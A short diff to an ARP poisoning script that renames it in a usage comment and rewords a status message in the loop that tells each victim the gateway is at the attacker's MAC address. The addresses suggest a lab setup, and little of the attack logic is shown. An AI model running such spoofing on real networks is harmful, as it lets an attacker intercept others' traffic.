@@ -13,7 +13,7 @@ import argparse
 #
 # Silent mode:
 #
-# sudo python3 arp_poisoner_modes.py \
+# sudo python3 arp_poisoning.py \
 #  --victims 192.168.56.101 192.168.56.104 \                    ---if multiple victims
 #  --gateway 192.168.56.102 \
 #  --iface enp0s3 \
@@ -115,7 +115,7 @@ def main():
     signal.signal(signal.SIGINT, stop)
 
     # --- ARP Spoofing Loop ---
-    print("Starting ARP spoofing in mode. Press Ctrl+C to stop.")
+    print("Starting ARP spoofing (press Ctrl+C to stop)")
     while True:
         for ip, mac in victim_macs.items():
             spoof(ip, mac, gateway_ip, iface)           # Tell victim: "Gateway is at my MAC"
